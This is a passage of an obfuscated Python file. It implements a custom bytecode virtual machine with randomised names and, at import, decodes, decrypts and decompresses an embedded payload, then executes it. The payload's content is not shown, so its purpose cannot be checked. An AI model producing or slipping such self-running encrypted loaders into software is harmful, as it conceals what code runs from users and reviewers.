10560: _xc47f, 10324: _xide9, 11840: _xcd2b, 9584: _xg40b, 8340: _xq839, 9172: _xbec1, 9116: _xh214, 10784: _xgf9c, 11116: _xvb5e, 11228: _xd714, 9416: _xzec8, 11044: _xl6af, 8668: _xrd75, 8712: _xdb8b, 11144: _xr5b0, 9620: _xx1dd, 10600: _xr264, 9268: _xr291, 10728: _xh492, 11504: _xy1c0, 11180: _xdfc1, 11812: _xk8d1, 8796: _xn6ab, 10308: _xbcac, 12124: _drc41, 12000: _xy395, 11600: _xxa5a, 11952: _xf91f}, 3: {11945: _xu5c6, 10053: _xw8c9, 14401: _xi755, 10993: _xb4aa, 9717: _dr5ca, 11049: _xl39a, 8737: _xz783, 9149: _xcc53, 8509: _xr3a4, 15113: _xbec1, 9397: _xc817, 9133: _xu1f1, 9485: _xd4fa, 14557: _xc7b5, 9613: _xu293, 11777: _xh1ed, 9973: _xbb6f, 11141: _xla3c, 9073: _xq4ce, 11853: _dv2a8, 15165: _xyff8, 14781: _xba58, 11973: _xqfb2, 9569: _xe7c0, 15009: _xlf18, 11261: _xv4a5, 12181: _xo977, 12137: _xd5b2, 9769: _xx9ac, 11453: _xs763, 15077: _xh6e9, 15185: _xi31e, 11129: _xic3a, 11213: _xi841, 10089: _xrb97, 8885: _xr31d, 15109: _xs299, 8729: _xg282, 8529: _xvb65, 10589: _xb17a, 8553: _xgc68, 10341: _xy662, 12077: _xvf28, 9217: _xn8c5, 8453: _dzb76, 10625: _xx566, 9261: _xye94, 10293: _xad24, 10481: _xw9b8, 8405: _xh206, 10005: _xs9dc, 9857: _xe409, 11057: _xue58, 9257: _xha6a, 11873: _xhf0c, 15053: _xj386, 8221: _xs9dc, 11789: _xz5eb, 10661: _xd166, 14581: _xsa83, 9129: _xrd03, 14477: _xh775, 11437: _xt16c, 11721: _xe53c, 9125: _xvf28, 8485: _xrd15, 11325: _xzbe3}}
_ex8fsv87 = None
def _x81sdw4sh(frame):
 global _ex8fsv87; old_frame = _ex8fsv87; _ex8fsv87 = frame; _irt05uirod = []
 try:
  code = frame._vljexq77aw; instructions = code.instructions
  consts = code.consts; names = code.names; stack = frame._ac56t4uf
  registers = frame._ok2iagl58; fastlocals = frame._v7eedtjv
  globals_dict = frame._schj755n; locals_dict = frame._f4zw9xa3k
  builtins_dict = globals_dict.get('__builtins__')
  if isinstance(builtins_dict, type(_sys)):
   builtins_dict = builtins_dict.__dict__
  elif hasattr(builtins_dict, '__dict__'):
   builtins_dict = builtins_dict.__dict__
  def _yyzoyn6qic(new_f):
   nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   _irt05uirod.append(frame); frame = new_f; code = frame._vljexq77aw
   instructions = code.instructions; consts = code.consts; names = code.names
   stack = frame._ac56t4uf; registers = frame._ok2iagl58
   fastlocals = frame._v7eedtjv; globals_dict = frame._schj755n
   locals_dict = frame._f4zw9xa3k
   builtins_dict = globals_dict.get('__builtins__')
   if isinstance(builtins_dict, type(_sys)):
    builtins_dict = builtins_dict.__dict__
   elif hasattr(builtins_dict, '__dict__'):
    builtins_dict = builtins_dict.__dict__
   return True
  def _atvazccbls(val):
   nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   if _irt05uirod:
    frame = _irt05uirod.pop(); code = frame._vljexq77aw
    instructions = code.instructions; consts = code.consts; names = code.names
    stack = frame._ac56t4uf; registers = frame._ok2iagl58
    fastlocals = frame._v7eedtjv; globals_dict = frame._schj755n
    locals_dict = frame._f4zw9xa3k
    builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
     builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
     builtins_dict = builtins_dict.__dict__
    stack.append(val); return True
   return False
  while frame._z5a0l725 in instructions:
   opcode, arg = instructions[frame._z5a0l725]; frame._z5a0l725 += 3
   try:
    sub_tbl = _cT_f5af.get(opcode % 4)
    if sub_tbl:
     h = sub_tbl.get(opcode ^ 10686)
     if h:
      res = h(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers)
      if res is _RET_SIGNAL:
       if _atvazccbls(frame._ixo9t7e8g):
        continue
       return frame._ixo9t7e8g
    if frame._sjza7tz0 is not None:
     _odxtad1ior = frame._sjza7tz0; frame._sjza7tz0 = None
     _yyzoyn6qic(_odxtad1ior); continue
   except Exception as exc:
    handled = False
    while True:
     while frame._el6246hi:
      b = frame._el6246hi.pop()
      if b.type == _kdd4v30t.WITH:
       del stack[b.stack_height:]; suppress = False
       if b.exit_fn:
        try:
         suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
        except Exception:
         suppress = False
       if suppress:
        frame._z5a0l725 = b.handler_pc; handled = True; break
      elif b.type in (_kdd4v30t.EXCEPT, _kdd4v30t.FINALLY):
       del stack[b.stack_height:]; stack.append(exc)
       frame._z5a0l725 = b.handler_pc; handled = True; break
     if handled:
      break
     if _irt05uirod:
      frame = _irt05uirod.pop(); code = frame._vljexq77aw
      instructions = code.instructions; consts = code.consts; names = code.names
      stack = frame._ac56t4uf; registers = frame._ok2iagl58
      fastlocals = frame._v7eedtjv; globals_dict = frame._schj755n
      locals_dict = frame._f4zw9xa3k
      builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
       builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
       builtins_dict = builtins_dict.__dict__
     else:
      break
    if not handled:
     raise
  return None
 finally:
  _ex8fsv87 = old_frame
def _lt2tala7():
 _psn = _ziiuc039t()
 decrypted = _u2pcn9t8(_b64.b85decode(_p2lk2n7h9g()), _rv25ao20())
 raw = _zlib.decompress(decrypted); reader = _uaji0y6d(raw)
 root_code = _hv3a3zmf8(reader); g = globals()
 if '__builtins__' not in g:
  g['__builtins__'] = _builtins
 f = _vzycwtiqj(root_code, g, locals_dict=g)
 if _psn:
  f._jlookep7y6 ^= _psn
 return _x81sdw4sh(f)
_lt2tala7()
